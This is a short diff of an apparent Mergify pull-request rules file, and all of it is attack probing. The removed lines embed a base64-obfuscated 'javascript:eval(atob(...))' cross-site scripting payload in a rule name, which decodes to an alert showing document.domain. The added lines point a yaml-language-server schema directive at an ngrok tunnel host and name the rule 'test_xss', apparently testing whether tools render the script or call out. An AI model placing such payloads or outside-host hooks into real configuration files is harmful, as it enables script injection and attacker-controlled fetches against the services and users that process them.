@@ -1,7 +1,8 @@
-pull_request_rules:
-  - name: "[⚠️ Security Alert: Review Required](javascript:eval%28atob%28%27YWxlcnQoIlhTUyBvbjogIiArIGRvY3VtZW50LmRvbWFpbik=%27%29%29)"
-    conditions:
-      - base=main
-    actions:
-      comment:
-        message: "Triggered"
+ # yaml-language-server: $schema=https://416c-171-246-97-52.ngrok-free.app/schema.json
+   pull_request_rules:
+     - name: test_xss
+       conditions:
+         - base=main
+       actions:
+         comment:
+           message: test
